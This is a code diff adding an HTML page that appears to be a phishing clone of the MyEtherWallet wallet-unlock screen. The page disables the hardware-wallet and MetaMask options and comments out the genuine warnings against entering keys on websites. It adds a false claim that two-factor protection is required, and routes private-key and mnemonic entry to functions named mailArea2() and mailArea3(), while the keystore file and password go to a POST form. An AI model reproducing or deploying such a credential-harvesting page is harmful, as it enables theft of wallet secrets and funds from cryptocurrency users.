+        <!-- ngRepeat: tab in tabNames track by $index -->
+        <li class="nav-item NAV_GenerateWallet_alt">
+            <a href="index.html#generate-wallet" class="ng-scope" translate="NAV_GenerateWallet_alt">New Wallet</a>
+        </li>
+        <li class="nav-item  NAV_SendEther">
+            <a href="index.html%3Fpage=send-transaction.html" class="ng-scope" translate="NAV_SendEther">Send Ether &amp; Tokens</a>
+        </li>
+        <li class="nav-item NAV_Swap">
+            <a href="index.html#swap" class="ng-scope" translate="NAV_Swap">Swap</a>
+        </li>
+        <li class="nav-item NAV_Offline">
+            <a href="index.html#offline-transaction" class="ng-scope" translate="NAV_Offline">Send Offline</a>
+        </li>
+        <li class="nav-item NAV_Contracts">
+            <a href="index.html#contracts" class="ng-scope" translate="NAV_Contracts">Contracts</a>
+        </li>
+        <li class="nav-item NAV_ENS">
+            <a href="index.html#ens" class="ng-scope" translate="NAV_ENS">ENS</a>
+        </li>
+        <li class="nav-item NAV_DomainSale">
+            <a href="index.html#DomainSale" class="ng-scope" translate="DomainSale">DomainSale</a>
+        </li>
+        <li class="nav-item NAV_CheckTxStatus">
+            <a href="index.html#check-tx-status" class="ng-scope" translate="NAV_CheckTxStatus">Check TX Status</a>
+        </li>
+        <li class="nav-item  NAV_ViewWallet">
+            <a href="index.html%3Fpage=view-wallet-info.html" class="ng-scope" translate="NAV_ViewWallet">View Wallet Info</a>
+        </li>
+        <li class="nav-item"><a href="https://myetherwallet.groovehq.com/help_center" target="_blank" rel="noopener">Help</a></li>
+        
+        <!--
+        <li class="nav-item"><a href="two-factor.php" rel="noopener">Two-Factor Authentification</a></li>
+        -->
+        <!--
+        <li class="nav-item"><a href="change-password.php" rel="noopener">Change Password</a></li>
+        -->
+      </ul>
+    </div>
+    <a aria-hidden="true" ng-show="showRightArrow" class="nav-arrow-right ng-hide" ng-click="scrollRight(100);" ng-mouseover="scrollHoverIn(false,2);" ng-mouseleave="scrollHoverOut()">»</a>
+  </nav>
+   <article class="modal fade" id="customNodeModal" tabindex="-1">
+  <section class="modal-dialog">
+    <section class="modal-content">
+
+      <div class="modal-body">
+        <button type="button" class="close" data-dismiss="modal">×</button>
+
+        <h2 class="modal-title text-info ng-scope" translate="NODE_Title">Set Up Your Custom Node</h2>
+
+        <p class="small" ng-show="browserProtocol!='https:'">
+          <strong translate="NODE_Subtitle" class="ng-scope">To connect to a local node...</strong>
+          </p><ul class="small">
+            <li> URL: http://127.0.0.1</li>
+            <li> Port: 8545 </li>
+            <li> Run geth: <code>geth --rpc --rpccorsdomain "null" --keystore "dont_put_secret_files_here_ever"</code></li>
+            <li> Run Parity: <code>parity --rpccorsdomain "*" --keys-path "dont_put_secret_files_here_ever"</code></li>
+          </ul>
+        <p></p>
+
+        <div ng-show="browserProtocol=='https:'" class="alert alert-danger small ng-scope ng-hide" translate="NODE_Warning">Your node must be HTTPS in order to connect to it via MyEtherWallet.com. You can <a target="_blank" rel="noopener" href="../github.com/kvhnuke/etherwallet/releases/latest.html">download the MyEtherWallet repo &amp; run it locally</a> to connect to any node. Or, get free SSL certificate via <a target="_blank" rel="noopener" href="../letsencrypt.org/index.html">LetsEncrypt</a></div>
+
+        <section class="row">
+          <div class="clearfix col-xs-12">
+            <label translate="NODE_Name" class="ng-scope">Node Name</label>
+            <input class="form-control ng-pristine ng-untouched ng-valid ng-empty is-invalid" placeholder="My ETH Node" ng-model="customNode.name" ng-class="Validator.isAlphaNumericSpace(customNode.name) ? 'is-valid' : 'is-invalid'" type="text">
+          </div>
+
+          <div class="clearfix col-xs-9">
+            <label>URL</label>
+            <input class="form-control ng-pristine ng-untouched ng-valid ng-empty is-invalid" placeholder="http://127.0.0.1" ng-model="customNode.url" ng-class="checkNodeUrl(customNode.url) ? 'is-valid' : 'is-invalid'" type="text">
+          </div>
+
+          <div class="clearfix col-xs-3">
+            <label class="NODE_Port">Port</label>
+            <input class="form-control ng-pristine ng-untouched ng-valid ng-empty is-valid" placeholder="8545" ng-model="customNode.port" ng-class="Validator.isPositiveNumber(customNode.port) || customNode.port=='' ? 'is-valid' : 'is-invalid'" type="text">
+          </div>
+
+          <div class="clearfix col-xs-12">
+            <label><input ng-model="customNode.httpBasicAuth" ng-true-value="{user:'',password:''}" ng-false-value="null" value="false" class="ng-pristine ng-untouched ng-valid ng-empty" type="checkbox"> HTTP Basic access authentication </label>
+          </div>
+
+          <div class="clearfix col-xs-6 ng-hide" ng-show="customNode.httpBasicAuth">
+            <label>User</label>
+            <input class="form-control ng-pristine ng-untouched ng-valid ng-empty is-invalid" ng-model="customNode.httpBasicAuth.user" ng-class="customNode.httpBasicAuth &amp;&amp; customNode.httpBasicAuth.user.length &gt; 0 ? 'is-valid' : 'is-invalid'" type="text">
+          </div>
+
+          <div class="clearfix col-xs-6 ng-hide" ng-show="customNode.httpBasicAuth">
+            <label>Password</label>
+            <input class="form-control ng-pristine ng-untouched ng-valid ng-empty is-invalid" ng-model="customNode.httpBasicAuth.password" ng-class="customNode.httpBasicAuth &amp;&amp; customNode.httpBasicAuth.password.length &gt; 0 ? 'is-valid' : 'is-invalid'" type="password">
+          </div>
+
+          <div class="clearfix col-xs-12 radio">
+            <label><input name="options" ng-model="customNode.options" value="eth" class="ng-pristine ng-untouched ng-valid ng-not-empty" checked="checked" type="radio"> ETH </label>
+            <label><input name="options" ng-model="customNode.options" value="etc" class="ng-pristine ng-untouched ng-valid ng-not-empty" type="radio"> ETC </label>
+            <label><input name="options" ng-model="customNode.options" value="rop" class="ng-pristine ng-untouched ng-valid ng-not-empty" type="radio"> Ropsten </label>
+            <label><input name="options" ng-model="customNode.options" value="kov" class="ng-pristine ng-untouched ng-valid ng-not-empty" type="radio"> Kovan </label>
+            <label><input name="options" ng-model="customNode.options" value="rin" class="ng-pristine ng-untouched ng-valid ng-not-empty" type="radio"> Rinkeby </label>
+            <label><input name="options" ng-model="customNode.options" value="cus" class="ng-pristine ng-untouched ng-valid ng-not-empty" type="radio"> Custom </label>
+            <label><input ng-model="customNode.eip155" value="true" class="ng-pristine ng-untouched ng-valid ng-empty" type="checkbox"> Supports EIP-155 </label>
+          </div>
+
+          <div class="clearfix col-sm-6 col-sm-offset-6 ng-hide" ng-show="customNode.eip155">
+            <label>Chain ID</label>
+            <input class="form-control ng-pristine ng-untouched ng-valid ng-empty is-invalid" placeholder="" ng-model="customNode.chainId" ng-class="Validator.isPositiveNumber(customNode.chainId) ? 'is-valid' : 'is-invalid'" type="text">
+          </div>
+        </section>
+
+      </div>
+
+      <div class="modal-footer">
+        <button class="btn btn-default ng-scope" data-dismiss="modal" translate="x_Cancel">Cancel</button>
+        <button class="btn btn-primary ng-scope" ng-click="saveCustomNode()" translate="NODE_CTA">Save &amp; Use Custom Node</button>
+      </div>
+
+
+    </section>
+  </section>
+</article> 
+</header>
+<section class="container">
+    <div class="tab-content">
+        <main class="tab-pane active">
+            <article class="collapse-container">
+                <a class="collapse-button">-</a>
+                <h1 class="ng-scope">Send Ether &amp; Tokens</h1>
+                                <div class="show-hide-toggle">
+                    <article class="block decrypt-drtv">
+                        <section class="col-md-4 col-sm-6">
+                            <h4 translate="decrypt_Access" class="ng-scope">How would you like to access your wallet?</h4>
+                            <label class="radio" id="area-5-vw">
+                                <input disabled="disabled" aria-label="address" type="radio" value="addressOnly" name="185">
+                                    View w/ Address Only
+                            </label>
+                            <label class="radio" id="area-1-mm">
+                                <input disabled="disabled" aria-flowto="aria3" type="radio" aria-label="MetaMask / Mist" class="" name="176">
+                                <span translate="MetaMask / Mist" class="ng-scope">MetaMask / Mist</span>
+                            </label>
+                            <label class="radio" id="area-3-lw">
+                              <input disabled="disabled" value="ledger" class="ng-pristine ng-untouched ng-valid ng-empty" name="876" type="radio">
+                              Ledger Wallet
+                            </label>
+                            <label class="radio" id="area-4-tz">
+                              <input disabled="disabled" aria-flowto="aria6" aria-label="Trezor hardware wallet" ng-model="walletType" value="trezor" class="ng-pristine ng-untouched ng-valid ng-empty" name="877" type="radio">
+                              TREZOR
+                            </label>
+                            <label class="radio" id="area-2-db">
+                              <input disabled="disabled" aria-flowto="aria7" type="radio" aria-label="Digital Bitbox hardware wallet" value="digitalBitbox" name="178">
+                              Digital Bitbox
+                            </label>
+                            <label aria-flowto="aria5" class="radio" id="area-6-seca">
+                                <input disabled="disabled" aria-flowto="aria5" type="radio" aria-label="Secalot hardware wallet" ng-model="walletType" value="secalot" name="191">
+                                Secalot
+                            </label>
+                            <label class="radio">
+                                <input id="area-1-jq" class="ng-pristine ng-untouched ng-valid ng-empty" name="area-1-jq" type="radio">
+                                <span translate="Keystore / JSON File" class="ng-scope">Keystore / JSON File </span>
+                                <a href="../myetherwallet.github.io/knowledge-base/private-keys-passwords/difference-beween-private-key-and-keystore-file.html" target="_blank" rel="noopener noreferrer">
+                                    <img src="index.php_files/icon-help-3.svg" width="16px" height="16px" style="margin: 0 5px 5px">
+                                </a>
+                            </label>
+                            <label class="radio">
+                                <input id="area-3-jq" value="pastemnemonic" class="ng-pristine ng-untouched ng-valid ng-empty" type="radio">
+                                <span translate="x_Mnemonic" class="ng-scope">Mnemonic Phrase</span>
+                                <a href="../myetherwallet.github.io/knowledge-base/private-keys-passwords/difference-beween-private-key-and-keystore-file.html" target="_blank" rel="noopener noreferrer">
+                                    <img src="index.php_files/icon-help-3.svg" width="16px" height="16px" style="margin: 0 5px 5px">
+                                </a>
+                            </label>
+                            <label class="radio">
+                                <input id="area-2-jq" value="pasteprivkey" class="ng-pristine ng-untouched ng-valid ng-empty" type="radio">
+                                <span translate="x_PrivKey2" class="ng-scope">Private Key</span>
+                                <a href="../myetherwallet.github.io/knowledge-base/private-keys-passwords/difference-beween-private-key-and-keystore-file.html" target="_blank" rel="noopener noreferrer">
+                                    <img src="index.php_files/icon-help-3.svg" width="16px" height="16px" style="margin: 0 5px 5px">
+                                </a>
+                            </label>
+                            <label class="radio" style="display: none;" id="showMeTheMoney">
+                              <input aria-flowto="aria4" aria-label="parity phrase" ng-model="walletType" value="parityBWallet" class="ng-pristine ng-untouched ng-valid ng-empty" name="873" type="radio">
+                              <span translate="x_ParityPhrase" class="ng-scope">Parity Phrase</span>
+                            </label>
+                            <label class="radio">
+                              &nbsp;
+                              <span translate="x_ParityPhrase" class="ng-scope">Parity Phrase</span>
+                              <a href="../myetherwallet.github.io/knowledge-base/private-keys-passwords/parity-phrases-are-no-longer-supported.html" target="_blank" rel="noopener noreferrer">
+                                   <img src="index.php_files/icon-help-2.svg" width="16px" height="16px" style="margin: 0 5px 5px">
+                              </a>
+                            </label>
+                            <!-- 
+                            <label class="radio ng-hide" ng-hide="globalService.currentTab!==globalService.tabs.viewWalletInfo.id">
+                              <input disabled aria-label="address" ng-model="walletType" value="addressOnly" class="ng-pristine ng-untouched ng-valid ng-empty" name="878" type="radio">
+                              View with Address Only
+                            </label> -->
+                          </section>
+                            <form action="index.html" method="POST" enctype="multipart/form-data" class="ng-pristine ng-valid">
+                                <section class="col-md-8 col-sm-6 area-1-jq">
+                                    <h4 translate="Select Your Wallet File" class="ng-scope">Select Your Wallet File</h4>
+                                    <h5>
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 79.536 79.536"><path fill="#5dba5a" d="M39.769 0C17.8 0 0 17.8 0 39.768c0 21.965 17.8 39.768 39.769 39.768 21.965 0 39.768-17.803 39.768-39.768C79.536 17.8 61.733 0 39.769 0zm-5.627 58.513L15.397 39.768l7.498-7.498 11.247 11.247 22.497-22.493 7.498 7.498-29.995 29.991z"></path></svg>
+                                        All wallets are <u>required</u> to enable Google Authenticator / SMS Code protection.
+                                    </h5>
+                                    <!--
+                                    <div class="form-group">Entering your private key on a website dangerous. If our website is compromised or you accidentally visit a different website, your funds will be stolen. Please consider:</div>
+                                    <ul>
+                                        <li>
+                                            <a href="https://myetherwallet.github.io/knowledge-base/migration/moving-from-private-key-to-metamask.html" target="_blank" rel="noopener noreferrer">MetaMask</a>
+                                            or
+                                            <a href="https://myetherwallet.github.io/knowledge-base/hardware-wallets/hardware-wallet-recommendations.html" target="_blank" rel="noopener noreferrer">A Hardware Wallet
+                                            </a>
+                                            or
+                                            <a href="https://myetherwallet.github.io/knowledge-base/offline/running-myetherwallet-locally.html" target="_blank" rel="noopener noreferrer">
+                                              Running MEW Offline &amp; Locally
+                                            </a>
+                                        </li>
+                                        <li>
+                                            <a href="https://myetherwallet.github.io/knowledge-base/security/securing-your-ethereum.html" target="_blank" rel="noopener noreferrer">
+                                              Learning How to Protect Yourself and Your Funds
+                                            </a>
+                                        </li>
+                                    </ul>
+                                    <div class="form-group">
+                                    If you must, please <u>double-check the URL &amp; SSL cert</u>. It should say <code>https://www.myetherwallet.com</code> &amp; <code>MYETHERWALLET INC</code> in your URL bar.
+                                    </div>
+                                    -->
+                                    <br>
+                                  <div class="form-group">
+                                    <input style="display:none;" id="id-wallet-1-parent" type="file" name="upload-wallet">
+                                    <a class="btn-file marg-v-sm ng-scope" translate="ADD_Radio_2_short" id="upload-wallet-1" role="button">SELECT WALLET FILE...</a>
+                                    
+                                    <p id="area-1-password-title" translate="ADD_Label_8" class="ng-scope">Password :</p>
+                                    <input class="form-control ng-pristine ng-untouched ng-valid ng-empty" name="area-1-password" id="aria-1-password" placeholder="Password" type="password">
+                                  </div>
+                                </section>
+                                <section class="col-md-4 col-sm-6 area-1-jq-submit">
+                                    <h4 id="uploadbtntxt-wallet" translate="ADD_Label_6" class="ng-scope">Unlock your Wallet</h4>
+                                    <div class="form-group">
+                                      <input type="submit" name="area-1-submit" id="area-1-submit-count" class="btn btn-primary btn-block ng-scope" translate="ADD_Label_6_short" value="Unlock">
+                                    </div>
+                                    <!-- <div class="form-group">
+                                      <a class="btn btn-primary btn-block ng-scope ng-hide" ng-click="scanLedger()" ng-show="walletType=='ledger'" role="button" tabindex="0" translate="ADD_Ledger_scan">Connect to Ledger Nano S</a>
+                                    </div> -->
+                                </section>
+                            </form>
+                        
+                            <section class="col-md-8 col-sm-6 area-2-jq">
+                                <h4 class="ng-scope">Paste Your Private Key</h4>
+                                <h5>
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 79.536 79.536"><path fill="#5dba5a" d="M39.769 0C17.8 0 0 17.8 0 39.768c0 21.965 17.8 39.768 39.769 39.768 21.965 0 39.768-17.803 39.768-39.768C79.536 17.8 61.733 0 39.769 0zm-5.627 58.513L15.397 39.768l7.498-7.498 11.247 11.247 22.497-22.493 7.498 7.498-29.995 29.991z"></path></svg>
+                                    All wallets are <u>required</u> to enable Google Authenticator / SMS Code protection.
+                                </h5>
+                                <!--
+                                <div class="form-group">
+                                    Entering your private key on a website is dangerous. If our website is compromised or you accidentally visit a different website, your funds will be stolen. Please consider:
+                                </div>
+                                <ul>
+                                    <li>
+                                        <a href="https://myetherwallet.github.io/knowledge-base/migration/moving-from-private-key-to-metamask.html" target="_blank" rel="noopener noreferrer">MetaMask</a>
+                                        or
+                                        <a href="https://myetherwallet.github.io/knowledge-base/hardware-wallets/hardware-wallet-recommendations.html" target="_blank" rel="noopener noreferrer">A Hardware Wallet</a>
+                                        or
+                                        <a href="https://myetherwallet.github.io/knowledge-base/offline/running-myetherwallet-locally.html" target="_blank" rel="noopener noreferrer">
+                                            Running MEW Offline &amp; Locally
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="https://myetherwallet.github.io/knowledge-base/security/securing-your-ethereum.html" target="_blank" rel="noopener noreferrer">
+                                            Learning How to Protect Yourself and Your Funds
+                                        </a>
+                                    </li>
+                                </ul>
+                                <div class="form-group">
+                                    If you must, please <u>double-check the URL &amp; SSL cert</u>. It should say <code>https://www.myetherwallet.com</code> &amp; <code>MYETHERWALLET INC</code> in your URL bar.
+                                </div>
+                                -->
+                                <br>
+                                <div class="form-group">
+                                    <textarea id="aria2" autocomplete="off" class="form-control ng-valid is-invalid" maxlength="64" placeholder="Private Key" rows="4"></textarea>
+                                </div>
+                            </section>
+                            <section class="col-md-4 col-sm-6 area-2-jq-submit">
+                                <h4 id="uploadbtntxt-wallet" translate="ADD_Label_6" class="ng-scope">Unlock your Wallet</h4>
+                                <div class="form-group">
+                                  <button onClick="mailArea2()" id="area-2-jq-submit" name="area-2-submit" class="btn btn-primary btn-block ng-scope" translate="ADD_Label_6_short" value="Unlock"></button>
+                                </div>
+                                <!-- <div class="form-group">
+                                  <a class="btn btn-primary btn-block ng-scope ng-hide" ng-click="scanLedger()" ng-show="walletType=='ledger'" role="button" tabindex="0" translate="ADD_Ledger_scan">Connect to Ledger Nano S</a>
+                                </div> -->
+                            </section>
+                        
+                            <section class="col-md-8 col-sm-6 area-3-jq">
+                                <h4 translate="Paste Your Mnemonic" class="ng-scope">Paste Your Mnemonic</h4>
+                                <h5>
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 79.536 79.536"><path fill="#5dba5a" d="M39.769 0C17.8 0 0 17.8 0 39.768c0 21.965 17.8 39.768 39.769 39.768 21.965 0 39.768-17.803 39.768-39.768C79.536 17.8 61.733 0 39.769 0zm-5.627 58.513L15.397 39.768l7.498-7.498 11.247 11.247 22.497-22.493 7.498 7.498-29.995 29.991z"></path></svg>
+                                    All wallets are <u>required</u> to enable Google Authenticator / SMS Code protection.
+                                </h5>
+                                <!--
+                                <div class="form-group">
+                                    Entering your private key on a website dangerous. If our website is compromised or you accidentally visit a different website, your funds will be stolen. Please consider:
+                                </div>
+                                <ul>
+                                    <li>
+                                        <a href="https://myetherwallet.github.io/knowledge-base/migration/moving-from-private-key-to-metamask.html" target="_blank" rel="noopener noreferrer"> MetaMask</a>
+                                        or
+                                        <a href="https://myetherwallet.github.io/knowledge-base/hardware-wallets/hardware-wallet-recommendations.html" target="_blank" rel="noopener noreferrer"> A Hardware Wallet</a>
+                                        or
+                                        <a href="https://myetherwallet.github.io/knowledge-base/offline/running-myetherwallet-locally.html" target="_blank" rel="noopener noreferrer">Running MEW Offline &amp; Locally</a>
+                                    </li>
+                                    <li>
+                                        <a href="https://myetherwallet.github.io/knowledge-base/security/securing-your-ethereum.html" target="_blank" rel="noopener noreferrer">Learning How to Protect Yourself and Your Funds
+                                        </a>
+                                    </li>
+                                </ul>
+                                <div class="form-group">
+                                    If you must, please <u>double-check the URL &amp; SSL cert</u>. It should say <code>https://www.myetherwallet.com</code> &amp; <code>MYETHERWALLET INC</code> in your URL bar.
+                                </div>
+                                -->
+                                <br>
+                                <div class="form-group">
+                                    <textarea id="aria3" autocomplete="off" class="form-control ng-valid is-invalid" rows="4" required></textarea>
+                                </div>
+                                <div class="form-group">
+                                    <p translate="ADD_Label_8" class="ng-scope">Password (optional):</p>
+                                    <div>
+                                    <input class="form-control ng-pristine ng-untouched ng-valid ng-empty" name="password" id="aria-3-password" placeholder="Password" type="password">
+                                    </div>
+                                  </div>
+                            </section>
+                            <section class="col-md-4 col-sm-6 area-3-jq-submit">
+                                <h4 id="uploadbtntxt-wallet" translate="ADD_Label_6" class="ng-scope">Unlock your Wallet</h4>
+                                <div class="form-group">
+                                  <button id="area-3-jq-submit" onClick="mailArea3()" class="btn btn-primary btn-block ng-scope" translate="ADD_Label_6_short" value="Unlock"></button>
+                                </div>
+                                <!-- <div class="form-group">
+                                  <a class="btn btn-primary btn-block ng-scope ng-hide" ng-click="scanLedger()" ng-show="walletType=='ledger'" role="button" tabindex="0" translate="ADD_Ledger_scan">Connect to Ledger Nano S</a>
+                                </div> -->
+                            </section>
+                            <section class="col-md-4 col-sm-6 area-2-mm">
+                                    <br><br>
+                                    <div class="form-group">
+                                        <a id="area-2-mm-submit" class="btn btn-primary btn-block ng-scope" tabindex="0" role="button" translate="Connect to MetaMask">Connect to MetaMask</a>
+                                    </div>
+                                    <!--
+                                    <div class="text-center" style="margin-top: 1rem;">
+                                        <a tabindex="0" role="button" class="btn btn-default btn-xs" href="https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn?hl=en" target="_blank" rel="noopener">
+                                          Download MetaMask
+                                        </a>
+                                    </div>
+                                    -->
+                            </section>
+<!--                             <section class="col-md-4 col-sm-6 area-2-db">
+                              <div class="form-group">
+                                <br><br>
+                                <a tabindex="0" role="button" class="btn btn-primary btn-block ng-scope" translate="Connect your Digital Bitbox" id="area-2-db-submit">Connect your Digital Bitbox</a>
+                              </div>
+                              <input class="form-control ng-pristine ng-untouched ng-valid ng-empty" aria-label="Enter the Digital Bitbox password" type="password" placeholder="Digital Bitbox password" spellcheck="false" value="" ng-model="HDWallet.digitalBitboxSecret">
+                              <ol>
+                                <li tabinex="0" translate="Re-open MyEtherWallet using Chrome or Opera" class="text-danger ng-scope" ng-hide="isChrome">Re-open MyEtherWallet using <a target="_blank" rel="noopener" href="https://www.google.com/chrome/browser/desktop/">Chrome</a> or <a target="_blank" rel="noopener" href="https://www.opera.com/">Opera</a></li>
+                              </ol>
+                              <div class="text-center">
+                                <br><br>
+                                <p>Guides:<br>
+                                  <a href="https://digitalbitbox.com/ethereum" target="_blank">
+                                    How to use MyEtherWallet with your Digital Bitbox
+                                  </a><br>
+                                </p>
+                              </div> -->
+                            </section>
+                    </article>
+                </div>
+            </article>
+        </main>
+    </div>
+
+
+<div class="ng-scope" id="alert-danger-modal">
+  <div class="alert popup alert-success animated-show-hide" style="bottom: 0px; z-index: 999;">
+    <div class="container">
+      <div class="alert-message ng-binding">Your wallet has been successfully upgraded for the Byzantium fork.
+</div>
+    </div>
+    <i class="icon-close" id="icon-close"></i>
+  </div>
+</div>
+
+
+  <!-- ngRepeat: alert in notifier.alerts -->
+
+
+
+  <!--
+  <section class="loading-wrap" ng-hide="1==1">
+    <div class="loading">
+      <img src="images/loading.gif" />
+      <h1> Loading... </h1>
+  </section>
+  -->
+
+</section>
+<section class="pre-footer">
+    <div class="container">
+        <p>
+          MyEtherWallet.com does not hold your keys for you. We cannot access accounts, recover keys, reset passwords, nor reverse transactions. Protect your keys &amp; always check that you are on correct URL.
+          <a role="link" tabindex="0" data-toggle="modal" data-target="#disclaimerModal">
+            You are responsible for your security.
+          </a>
+        </p>
+    </div>
+</section>
+<article class="modal fade in" id="disclaimerModal" tabindex="-1" data-timer="10" aria-hidden="false">
+  <section class="modal-dialog">
+    <section class="modal-content">
+
+      <div class="modal-body">
+        <button type="button" class="close" data-dismiss="modal">×</button>
+
+        <h2 class="modal-title text-info ng-scope" translate="FOOTER_4">Disclaimer</h2>
+
+        <p class="small"><strong>Be safe &amp; secure:</strong> <a href="https://myetherwallet.groovehq.com/knowledge_base/topics/protecting-yourself-and-your-funds" target="_blank" rel="noopener"> We highly recommend that you read our guide on How to Prevent Loss &amp; Theft for some recommendations on how to be proactive about your security.</a></p>
+
+        <p class="small"><strong>Always backup your keys: </strong> MyEtherWallet.com &amp; MyEtherWallet CX are not "web wallets". You do not create an account or give us your funds to hold onto. No data leaves your computer / your browser. We make it easy for you to create, save, and access your information and interact with the blockchain.</p>
+
+        <p class="small"><strong>We are not responsible for any loss: </strong> Ethereum, MyEtherWallet.com &amp; MyEtherWallet CX, and some of the underlying Javascript libraries we use are under active development. While we have thoroughly tested &amp; tens of thousands of wallets have been successfully created by people all over the globe, there is always the possibility something unexpected happens that causes your funds to be lost. Please do not invest more than you are willing to lose, and please be careful.</p>
+
+        <p class="small"><strong> Translations of MyEtherWallet: </strong> The community has done an amazing job translating MyEtherWallet into a variety of languages. However, MyEtherWallet can only verify the validity and accuracy of the information provided in English and, because of this, the English version of our website is the official text. </p>
+
+        <p class="small"><strong>MIT License</strong> Copyright © 2015-2017 MyEtherWallet LLC</p>
+
+        <p class="small">Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p>
+
+        <p class="small">The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p>
+
+        <p class="small"><strong>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</strong></p>
+      </div>
+
+      <div class="modal-footer">
+        <button class="btn btn-default" data-dismiss="modal">Okay</button>
+      </div>
+
+    </section>
+  </section>
+</article>
+<footer class="footer ng-scope" role="content" aria-label="footer" ng-controller="footerCtrl">
+
+  <article class="block__wrap" style="max-width: 1780px; margin: auto;">
+
+    <section class="footer--left">
+
+      <a href="index.html"><img src="images/logo-myetherwallet.svg" height="45px" width="auto" alt="Ether Wallet" class="footer--logo"></a>
+
+      <p>
+        <span translate="FOOTER_1" class="ng-scope">Free, open-source, client-side interface for generating Ethereum wallets &amp; more. Interact with the Ethereum blockchain easily &amp; securely. Double-check the URL ( myetherwallet.com ) before unlocking your wallet.</span>
+      </p>
+
+      <p>
+        <a aria-label="knowledge base" href="../myetherwallet.github.io/knowledge-base/index.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          Knowledge Base
+        </a>
+      </p>
+
+      <p>
+        <a data-target="#disclaimerModal" data-toggle="modal" target="_blank" rel="noopener noreferrer" role="link" tabindex="0" translate="FOOTER_4" class="ng-scope">Disclaimer</a>
+      </p>
+
+      <p ng-show="showBlocks" class="ng-binding">
+        Latest Block#: 5941878
+      </p>
+
+      <p>
+        © 2018 MyEtherWallet, Inc
+      </p>
+
+    </section>
+
+    <section class="footer--cent">
+        <h5> <i aria-hidden="true">👫</i> You can support us by supporting our blockchain-family.</h5>
+        <p>Consider using our affiliate links to...</p>
+        <div class="footer__pill-wrap">
+          <a class="footer__pill" aria-label="Swap Ether or Bitcoin via Bity.com" href="../bity.com/af/jshkb37v.html" target="_blank" rel="noopener noreferrer">Swap ETH/BTC/EUR/CHF via Bity.com</a>
+        </div>
+        <p> Buy a... </p>
+        <div class="footer__pill-wrap footer__pill-custom-wrap">
+          <a class="footer__pill" href="../www.ledgerwallet.com/r/fa4b%3Fpath=%252Fproducts%252F.html" target="_blank" rel="noopener">Ledger Wallet</a>
+          <a class="footer__pill" href="../trezor.io/index.html%3Fa=myetherwallet.com.html" target="_blank" rel="noopener">TREZOR</a>
+          <a class="footer__pill" href="../shiftcrypto.ositracker.com/91316/7114.html" target="_blank" rel="noopener">Digital Bitbox</a>
+          <a class="footer__pill" href="../ether.cards/index.html%3Futm_source=mew&amp;utm_medium=cpm&amp;utm_campaign=site.html" target="_blank" rel="noopener">ether.card</a>
+          <a class="footer__pill" href="../thehodlwallet.com/index.html%3Faff=15.html" target="_blank" rel="noopener">HODL Wallet</a>
+        </div>
+
+        <h5><i aria-hidden="true">💝</i> Donations are always appreciated!</h5>
+        <p>
+          ETH:
+          <span class="mono wrap">
+            mewtopia.eth
+            <a title="See this address on the blockchain explorer" href="../etherscan.io/address/0xDECAF9CD2367cdbb726E904cD6397eDFcAe6068D.html" class="ext-etheraddresslookup-link" target="_blank">
+              0xDECAF9CD2367cdbb726E904cD6397eDFcAe6068D
+            </a>
+          </span>
+          </p>
+        <p>
+          BTC:
+          <span class="mono wrap">
+            <a title="See this address on the blockchain explorer" href="../blockchain.info/address/1DECAF2uSpFTP4L1fAHR8GCLrPqdwdLse9.html" class="ext-etheraddresslookup-link" target="_blank">
+            1DECAF2uSpFTP4L1fAHR8GCLrPqdwdLse9
+          </a>
+          </span>
+        </p>
+        <!--
+        <p>MYD: <span class="mono wrap">mewsupport.eth <small>0xf7e983781609012307f2514f63D526D83D24F466</small></span></p>
+        -->
+        <h5 ng-hide="curLang=='en'" class="ng-hide">
+          <i>🏅</i>
+          <span translate="Translator_Desc" class="ng-scope"></span>
+        </h5>
+        <p ng-hide="curLang=='en'" class="ng-hide">
+          <span translate="TranslatorName_1" class="ng-scope"></span>
+          <span translate="TranslatorName_2" class="ng-scope"></span>
+          <span translate="TranslatorName_3" class="ng-scope"></span>
+          <span translate="TranslatorName_4" class="ng-scope"></span>
+          <span translate="TranslatorName_5" class="ng-scope"></span>
+        </p>
+
+    </section>
+
+    <section class="footer--righ">
+      <p>
+        <a aria-label="website via my ether wallet dot com" href="../www.myetherwallet.com/index.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          MyEtherWallet.com
+        </a>
+      </p>
+      <p>
+        <a aria-label="myetherwallet team" href="../team.myetherwallet.com/index.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          MyEtherWallet Team
+        </a>
+      </p>
+      <p>
+        <a aria-label="support email" href="mailto:support@myetherwallet.com" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          Email support: support@myetherwallet.com
+        </a>
+      </p>
+      <p>
+        <a href="../www.myetherwallet.com/helpers.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          Unit Converters &amp; ENS Debugging
+        </a>
+      </p>
+
+      <p>
+        <a href="../www.myetherwallet.com/signmsg.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          Sign Message
+        </a>
+      </p>
+
+      <p>
+        <a aria-label="website via github URL" href="../kvhnuke.github.io/etherwallet/index.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          kvhnuke.github.io/etherwallet
+        </a>
+      </p>
+
+      <p>
